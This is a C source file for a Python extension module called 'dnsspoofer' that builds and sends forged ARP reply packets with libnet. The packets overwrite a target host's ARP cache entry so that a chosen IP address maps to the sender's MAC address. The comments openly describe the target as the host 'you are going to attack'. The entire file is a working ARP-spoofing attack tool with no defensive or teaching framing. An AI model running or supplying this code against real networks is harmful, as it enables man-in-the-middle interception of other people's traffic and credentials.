#include <Python.h>
#include <libnet.h>

//#define RUN_WITH_ALLOW_THREADS

/**
 * @param vulnerable_host_mac_addr: host that you are going to attack
 * @param ip_cache_entry: IP for which you want to override ARP-cache entry with your MAC addr
 * TODO add ability to choose interface - libnet_init second argument
 * @return returns NULL on success and pointer to error_buffer on error.
 * The ownership of the error_buffer is transferred (error_buffer will need to be freed by the function that called spoof_arp).
 */
const char *

#ifdef RUN_WITH_ALLOW_THREADS
spoof_arp(const u_int8_t* vulnerable_host_mac_addr, char* ip_cache_entry, PyThreadState * _save){
#endif

#ifndef RUN_WITH_ALLOW_THREADS
spoof_arp(const u_int8_t* vulnerable_host_mac_addr, char* ip_cache_entry){
#endif

    libnet_t *ln;
    u_int32_t target_ip_addr, zero_ip_addr;
    u_int8_t zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    struct libnet_ether_addr* src_hw_addr;
    char errbuf[LIBNET_ERRBUF_SIZE];

    if((ln = libnet_init(LIBNET_LINK, NULL, errbuf))==NULL){
        char * error_buffer = malloc(LIBNET_ERRBUF_SIZE);
        if(error_buffer==NULL) {
#ifdef RUN_WITH_ALLOW_THREADS
             Py_BLOCK_THREADS;
             _save = NULL;
#endif
             return (char *) PyErr_NoMemory();
        }
        strncpy(error_buffer, errbuf, LIBNET_ERRBUF_SIZE);
        return error_buffer;
    }
    if((src_hw_addr = libnet_get_hwaddr(ln))==NULL)
        goto cleanup_error;
    if((target_ip_addr = libnet_name2addr4(ln, ip_cache_entry, LIBNET_RESOLVE)) == -1)
        goto cleanup_error;
    if((zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE)) == -1)
        goto cleanup_error;
    if(libnet_autobuild_arp(
            ARPOP_REPLY,                     /* operation type       */
            src_hw_addr->ether_addr_octet,   /* sender hardware addr */
            (u_int8_t*) &target_ip_addr,     /* sender protocol addr */
            zero_hw_addr,                    /* target hardware addr */
            (u_int8_t*) &zero_ip_addr,       /* target protocol addr */
            ln)==-1)                         /* libnet context       */
        goto cleanup_error;
    if(libnet_autobuild_ethernet(vulnerable_host_mac_addr, ETHERTYPE_ARP, ln) == -1)
        goto cleanup_error;
    if(libnet_write(ln)==1)
        goto cleanup_error;

    libnet_destroy(ln);
    return NULL;

    cleanup_error: ;
        char * error_buffer = libnet_geterror(ln);
        // libnet_destroy is going to destroy the error_buffer, so we need to copy it
        ssize_t error_size = strlen(error_buffer)+1;
        char * error_buffer_copy = malloc(error_size);
        if(error_buffer_copy == NULL){
#ifdef RUN_WITH_ALLOW_THREADS
            Py_BLOCK_THREADS;
            _save = NULL;
#endif
            return (char *) PyErr_NoMemory();
        }
        strncpy(error_buffer_copy, error_buffer, strlen(error_buffer)+1);
        libnet_destroy(ln);
        return error_buffer_copy;
}

static PyObject *
dnsspoofer_spoof_arp(PyObject *self, PyObject *args)
{
    PyBytesObject* target_mac_addr;
    PyBytesObject* ip_to_spoof; //TODO allow to either be bytes or str

    if (!PyArg_ParseTuple(args, "SS", &target_mac_addr, &ip_to_spoof))
        return NULL;


    const u_int8_t * vulnerable_host_mac_addr;
    Py_ssize_t vulnerable_host_mac_addr_size;
    if (PyBytes_AsStringAndSize((PyObject *) target_mac_addr, (char**)&vulnerable_host_mac_addr, &vulnerable_host_mac_addr_size)==-1)
        return NULL;
    if (vulnerable_host_mac_addr_size!=6){
        PyErr_SetString(PyExc_ValueError, "The mac address should have precisely 6 bytes!");
        return NULL;
    }

    char* ip_cache_entry;
    if(!(ip_cache_entry=PyBytes_AsString((PyObject*) ip_to_spoof)))
        return NULL;


    char * error_buffer;
#ifdef RUN_WITH_ALLOW_THREADS
    Py_BEGIN_ALLOW_THREADS
    error_buffer=spoof_arp(vulnerable_host_mac_addr, ip_cache_entry, _save);
#endif

#ifndef RUN_WITH_ALLOW_THREADS
    error_buffer=spoof_arp(vulnerable_host_mac_addr, ip_cache_entry);
#endif


#ifdef RUN_WITH_ALLOW_THREADS
    if(_save == NULL) // PyErr_NoMemory
        return NULL;
    Py_END_ALLOW_THREADS
#endif

    if(error_buffer){
        PyErr_SetString(PyExc_RuntimeError, error_buffer);
        return NULL;
    }
    if(PyErr_Occurred()){ // PyErr_NoMemory
        return NULL;
    }


    Py_RETURN_NONE;
}





static PyMethodDef DnsSpooferMethods[] = {
    {"spoof_arp",  dnsspoofer_spoof_arp, METH_VARARGS, "Spoof arp."},
    {NULL, NULL, 0, NULL}
};


static struct PyModuleDef dnsspoofer_module = {
   PyModuleDef_HEAD_INIT,
   "dnsspoofer",
   NULL,
   -1,
   DnsSpooferMethods
};

PyMODINIT_FUNC
PyInit_dnsspoofer(void)
{
    PyObject *m;

    m = PyModule_Create(&dnsspoofer_module);
    if (m == NULL)
        return NULL;

    return m;
}
